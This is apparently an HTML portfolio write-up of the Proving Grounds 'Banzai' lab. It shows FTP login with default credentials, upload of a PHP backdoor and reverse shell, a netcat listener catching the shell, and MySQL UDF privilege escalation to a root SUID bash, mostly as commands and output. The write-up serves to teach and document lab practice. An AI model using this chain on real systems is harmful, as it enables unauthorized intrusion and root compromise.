@@ -1,0 +1,244 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="This lab demonstrates exploiting weak FTP credentials to upload a PHP reverse shell to a web root for initial access. Learners will then leverage a misconfigured MySQL server running as root to escalate privileges using a custom User Defined Function (UDF). The lab emphasizes exploiting file upload vulnerabilities, database misconfigurations, and achieving command execution as root."><title>Proving Grounds: Banzai</title><style>
+  :root { --muted:#9aa4b2; --accent:#facc15; --text:#e6eef6; --mono:ui-monospace,SFMono-Regular,Menlo,Monaco,"Roboto Mono","Courier New",monospace; --maxw:900px; }
+  * { box-sizing:border-box; } html { scroll-behavior:smooth; }
+  body { margin:0; background:linear-gradient(180deg,#071021 0%,#0f1724 50%); color:var(--text); font-family:Inter,"Segoe UI",Roboto,system-ui,-apple-system,sans-serif; -webkit-font-smoothing:antialiased; line-height:1.6; }
+  .wrap { max-width:var(--maxw); margin:40px auto; padding:28px; background:linear-gradient(180deg,rgba(255,255,255,.02),rgba(255,255,255,.01)); border:1px solid rgba(255,255,255,.03); border-radius:12px; box-shadow:0 6px 30px rgba(2,6,23,.6); }
+  .site-header { display:flex; align-items:center; justify-content:space-between; gap:16px; padding-bottom:18px; margin-bottom:24px; border-bottom:1px solid rgba(255,255,255,.06); }
+  .site-brand { color:var(--accent); font-weight:750; letter-spacing:.02em; text-decoration:none; } .site-brand:hover,.site-link:hover { color:#ffe57a; } .site-link { color:var(--muted); font-size:13px; text-decoration:none; } .back-button { padding:7px 11px; border:1px solid rgba(250,204,21,.24); border-radius:7px; background:rgba(250,204,21,.08); color:var(--accent); font-weight:650; }
+  .target-tag { display:inline-block; margin-bottom:12px; padding:5px 10px; border:1px solid rgba(250,204,21,.24); border-radius:999px; color:var(--accent); background:rgba(250,204,21,.1); font-size:12px; font-weight:700; letter-spacing:.08em; text-transform:uppercase; }
+  header h1 { margin:0; font-size:28px; letter-spacing:-.2px; line-height:1.25; } header p { margin:8px 0 0; color:var(--muted); font-size:14px; }
+  .meta { display:flex; flex-wrap:wrap; gap:12px; align-items:center; margin-top:18px; color:var(--muted); font-size:13px; } .badge { background:rgba(250,204,21,.12); color:var(--accent); padding:6px 10px; border-radius:999px; font-weight:600; font-size:13px; }
+  nav.toc { margin-top:22px; padding:14px; background:rgba(255,255,255,.02); border:1px solid rgba(255,255,255,.02); border-radius:8px; } nav.toc ul { display:flex; flex-wrap:wrap; gap:10px; margin:0; padding:0; list-style:none; } nav.toc a { color:var(--muted); text-decoration:none; font-size:13px; } nav.toc a:hover { color:var(--accent); }
+  article { margin-top:28px; } h2 { margin-top:30px; color:var(--accent); font-size:22px; scroll-margin-top:20px; } h3 { margin-top:22px; color:#dfe9f6; font-size:17px; } h4,h5,h6 { color:#dfe9f6; } p,li { overflow-wrap:anywhere; } a { color:var(--accent); } strong { color:#f4f8fc; }
+  blockquote { margin:16px 0; padding:10px 12px; color:var(--muted); background:rgba(250,204,21,.06); border-left:3px solid rgba(250,204,21,.22); border-radius:4px; }
+  .code-brief { margin:18px 0 8px; color:var(--muted); font-size:14px; }
+  pre { margin:12px 0; padding:14px; overflow:auto; color:#dff3ff; background:#041022; border:1px solid rgba(255,255,255,.03); border-radius:8px; box-shadow:0 6px 18px rgba(2,6,23,.5); font:13px/1.55 var(--mono); } code { padding:2px 6px; border-radius:4px; background:rgba(255,255,255,.04); font-family:var(--mono); font-size:.9em; } pre code { padding:0; background:transparent; font-size:inherit; }
+  table { width:100%; margin-top:12px; border-collapse:collapse; } th,td { padding:8px; border-bottom:1px solid rgba(255,255,255,.06); text-align:left; color:var(--muted); font-size:14px; } th { color:#dfe9f6; font-weight:600; } hr { border:0; border-top:1px solid rgba(255,255,255,.08); margin:28px 0; } img { max-width:100%; border-radius:8px; }
+  footer { margin-top:30px; padding-top:12px; border-top:1px solid rgba(255,255,255,.02); color:var(--muted); font-size:13px; text-align:center; }
+  @media (max-width:720px) { .wrap { margin:18px; padding:16px; } header h1 { font-size:20px; } nav.toc ul { flex-direction:column; gap:6px; } }
+</style></head><body><main class="wrap"><div class="site-header"><a class="site-brand" href="index.html">Karan Tank</a><a class="site-link back-button" href="index.html">← Back to index</a></div><header><span class="target-tag">Target: Linux</span><h1>Proving Grounds: Banzai</h1><p>This lab demonstrates exploiting weak FTP credentials to upload a PHP reverse shell to a web root for initial access. Learners will then leverage a misconfigured MySQL server running as root to escalate privileges using a custom User Defined Function (UDF). The lab emphasizes exploiting file upload vulnerabilities, database misconfigurations, and achieving command execution as root.</p><div class="meta"><span class="badge">Proving Grounds</span><span>Authorized lab writeup</span><span>Cybersecurity portfolio</span></div></header><nav class="toc" aria-label="Table of contents"><ul><li><a href="#scenario">Scenario</a></li><li><a href="#lab-objective">Lab Objective</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#initial-access">Initial Access</a></li><li><a href="#privilege-escalation">Privilege Escalation</a></li><li><a href="#takeaways">Takeaways</a></li></ul></nav><article><blockquote>
+<p><strong>Authorized-lab note:</strong> This writeup documents activity performed exclusively in an authorized Offensive Security Proving Grounds lab. It is shared for educational and portfolio purposes.</p>
+</blockquote>
+<p>You will uncover weak credentials in an FTP service, allowing you to upload a web shell to a misconfigured web server. Following this, you will develop a custom function to execute commands as root on a poorly configured MySQL database. This exercise enhances your skills in credential exploitation and database misconfiguration attacks.</p>
+<h2 id="scenario">Scenario</h2>
+<p>This lab demonstrates exploiting weak FTP credentials to upload a PHP reverse shell to a web root for initial access. Learners will then leverage a misconfigured MySQL server running as root to escalate privileges using a custom User Defined Function (UDF). The lab emphasizes exploiting file upload vulnerabilities, database misconfigurations, and achieving command execution as root.</p>
+<h2 id="lab-objective">Lab Objective</h2>
+<p><strong>After completion of this lab, learners will be able to:</strong></p>
+<ul>
+<li>Enumerate services to identify the FTP server and attempt authentication with weak credentials.</li>
+<li>Upload a PHP reverse shell to the web root directory and trigger it to gain access.</li>
+<li>Discover database credentials from configuration files and authenticate to the MySQL server.</li>
+<li>Create and load a malicious UDF to execute commands as root on the target.</li>
+<li>Achieve a reverse shell as root by utilizing the UDF to execute a network command.</li>
+</ul>
+<h2 id="enumeration">Enumeration</h2>
+<p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># The output records the result observed during this authorized lab step.
+
+walter white
+sarah jhinson
+williamanderson
+amanda jepson</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># The output records the result observed during this authorized lab step.
+
+local: simple-backdoor.php remote: simple-backdoor.php
+200 EPRT command successful. Consider using EPSV.
+150 Ok to send data.
+100% |**************************************************************************************|   328        3.67 MiB/s    00:00 ETA
+226 Transfer complete.
+328 bytes sent in 00:00 (8.37 KiB/s)
+ftp&gt; dir
+200 EPRT command successful. Consider using EPSV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 1001     0            4096 May 26  2020 contactform
+drwxr-xr-x    2 1001     0            4096 May 26  2020 css
+drwxr-xr-x    3 1001     0            4096 May 26  2020 img
+-rw-r--r--    1 1001     0           23364 May 27  2020 index.php
+drwxr-xr-x    2 1001     0            4096 May 26  2020 js
+drwxr-xr-x   11 1001     0            4096 May 26  2020 lib
+-rw-r--r--    1 1001     1001          328 Jun 12 16:53 simple-backdoor.php
+226 Directory send OK.</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># Execute the next evidence-gathering step in the authorized lab.
+
+www-data@banzai:/$ mysql -u root -p
+mysql -u root -p
+Enter password: EscalateRaftHubris123
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 15
+Server version: 5.7.30 MySQL Community Server (GPL)
+
+Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+# Read the file contents for useful configuration or credential data.
+
+Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.
+
+mysql&gt; SHOW DATABASES;
+SHOW DATABASES;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+4 rows in set (0.00 sec)</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># Inspect the directory for files relevant to the next step.
+
+www-data@banzai:/var/www/html$ dir
+# Inspect the directory for files relevant to the next step.
+
+dir
+50236.py     css  index.php  lib     nc32.exe               shell.exe
+contactform  img  js         nc.exe  php-reverse-shell.php  simple-backdoor.php</code></pre><h2 id="initial-access">Initial Access</h2>
+<p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code># The scan output identifies the target&#39;s exposed services and their versions.
+
+PORT     STATE  SERVICE    VERSION
+20/tcp   closed ftp-data
+21/tcp   open   ftp        vsftpd 3.0.3
+22/tcp   open   ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 ba:3f:68:15:28:86:36:49:7b:4a:84:22:68:15:cc:d1 (RSA)
+|   256 2d:ec:3f:78:31:c3:d0:34:5e:3f:e7:6b:77:b5:61:09 (ECDSA)
+|_  256 4f:61:5c:cc:b0:1f:be:b4:eb:8f:1c:89:71:04:f0:aa (ED25519)
+25/tcp   open   smtp       Postfix smtpd
+|_ssl-date: TLS randomness does not represent time
+|_smtp-commands: banzai.offseclabs.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
+| ssl-cert: Subject: commonName=banzai
+| Subject Alternative Name: DNS:banzai
+| Not valid before: 2020-06-04T14:30:35
+|_Not valid after:  2030-06-02T14:30:35
+5432/tcp open   postgresql PostgreSQL DB 9.6.4 - 9.6.6 or 9.6.13 - 9.6.19
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=banzai
+| Subject Alternative Name: DNS:banzai
+| Not valid before: 2020-06-04T14:30:35
+|_Not valid after:  2030-06-02T14:30:35
+8080/tcp open   http       Apache httpd 2.4.25
+|_http-title: 403 Forbidden
+|_http-server-header: Apache/2.4.25 (Debian)
+8295/tcp open   http       Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Banzai</code></pre><p>Possible users</p>
+<ul>
+<li>Trying <code>admin:admin</code> credentials for FTP worked</li>
+<li>Uploading php backdoor</li>
+<li>uploaded php-reverse-shell.php from pentest monkey on port 22</li>
+<li>got revshell</li>
+</ul>
+<p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>(kali㉿kali)-[~/offsec/banzai]
+# Execute the next evidence-gathering step in the authorized lab.
+
+└─$ rlwrap nc -nlvp 22
+listening on [any] 22 ...
+connect to [192.168.45.205] from (UNKNOWN) [192.168.140.56] 47324
+Linux banzai 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64 GNU/Linux
+ 17:20:15 up  1:18,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can\&#39;t access tty; job control turned off
+# Confirm the identity of the current session.
+
+$ whoami
+www-data</code></pre><p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>(kali㉿kali)-[~/offsec/banzai]
+# Execute the next evidence-gathering step in the authorized lab.
+
+└─$ rlwrap nc -nlvp 22
+listening on [any] 22 ...
+connect to [192.168.45.205] from (UNKNOWN) [192.168.140.56] 47332
+Linux banzai 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64 GNU/Linux
+ 17:39:08 up  1:37,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can\&#39;t access tty; job control turned off
+# Run the helper or analysis script used in this lab step.
+
+$ python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+# Execute the next evidence-gathering step in the authorized lab.
+
+www-data@banzai:/$ ps -aux | grep &#39;mysql&#39;
+ps -aux | grep &#39;mysql&#39;
+root       678  0.0  8.6 1125460 177380 ?      Sl   16:01   0:01 /usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid
+www-data  2342  0.0  0.2  34772  6104 ?        S    17:26   0:00 mysql -u root -p
+www-data  2472  0.0  0.0  11108   932 pts/1    S+   17:39   0:00 grep mysql
+# Read the file contents for useful configuration or credential data.
+
+www-data@banzai:/$ cat /var/www/config.php
+# Read the file contents for useful configuration or credential data.
+
+cat /var/www/config.php
+&lt;?php
+define(&#39;DBHOST&#39;, &#39;127.0.0.1&#39;);
+define(&#39;DBUSER&#39;, &#39;root&#39;);
+define(&#39;DBPASS&#39;, &#39;EscalateRaftHubris123&#39;);
+define(&#39;DBNAME&#39;, &#39;main&#39;);
+?&gt;</code></pre><ul>
+<li>Could not find any useful information in any of the databases</li>
+<li>Searching for mysql version and trying to find priv esc exploits for mysql 5.7</li>
+<li><a href="https://www.exploit-db.com/exploits/50236">https://www.exploit-db.com/exploits/50236</a></li>
+<li>since we are not able to use python http server to upload files, uploading files using the ftp</li>
+</ul>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code># The output confirms the effective user and privilege level of the current session.
+
+mysql&gt; status;
+status;
+--------------
+mysql  Ver 14.14 Distrib 5.7.30, for Linux (x86_64) using  EditLine wrapper
+
+Connection id:          15
+Current database:
+Current user:           root@localhost
+SSL:                    Not in use
+Current pager:          stdout
+Using outfile:          &#39;&#39;
+Using delimiter:        ;
+Server version:         5.7.30 MySQL Community Server (GPL)
+Protocol version:       10
+Connection:             Localhost via UNIX socket
+Server characterset:    latin1
+Db     characterset:    latin1
+Client characterset:    latin1
+Conn.  characterset:    latin1
+UNIX socket:            /var/run/mysqld/mysqld.sock
+Uptime:                 679 days 12 hours 16 min 16 sec
+
+Threads: 2  Questions: 72  Slow queries: 0  Opens: 138  Flush tables: 1  Open tables: 131  Queries per second avg: 0.000
+--------------</code></pre><p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code># Execute the next evidence-gathering step in the authorized lab.
+
+www-data@banzai:/var/www/html$ python2 50236.py -u root -p EscalateRaftHubris123
+# Execute the next evidence-gathering step in the authorized lab.
+
+&lt;$ python2 50236.py -u root -p EscalateRaftHubris123
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Plugin dir is /usr/lib/mysql/plugin/
+Trying to create a udf library...
+mysql: [Warning] Using a password on the command line interface can be insecure.
+UDF library created successfully: /usr/lib/mysql/plugin/udf9431.so
+Trying to create sys_exec...
+mysql: [Warning] Using a password on the command line interface can be insecure.
+ERROR 1125 (HY000) at line 1: Function &#39;sys_exec&#39; already exists
+Checking if sys_exec was created...
+mysql: [Warning] Using a password on the command line interface can be insecure.
+sys_exec was found: *************************** 1. row ***************************
+name: sys_exec
+ ret: 2
+  dl: udf8336.so
+type: function
+
+Generating a SUID binary in /var/www/bash...
+mysql: [Warning] Using a password on the command line interface can be insecure.
++------------------------------------------------------------------+
+| sys_exec(&#39;cp /bin/bash /var/www/bash &amp;&amp; chmod +s /var/www/bash&#39;) |
++------------------------------------------------------------------+
+|                                                              256 |
++------------------------------------------------------------------+
+Trying to spawn a root shell...
+bash-4.4# id
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=114(mysql) groups=114(mysql),33(www-data)
+bash-4.4#</code></pre><h2 id="takeaways">Takeaways</h2>
+<p>This lab reinforced the value of methodical enumeration, evidence-driven hypothesis testing, and validating each access-control boundary in an authorized environment.</p>
+</article><footer>Written by Karan Tank · Documented for educational and portfolio purposes in an authorized lab environment.</footer></main></body></html>
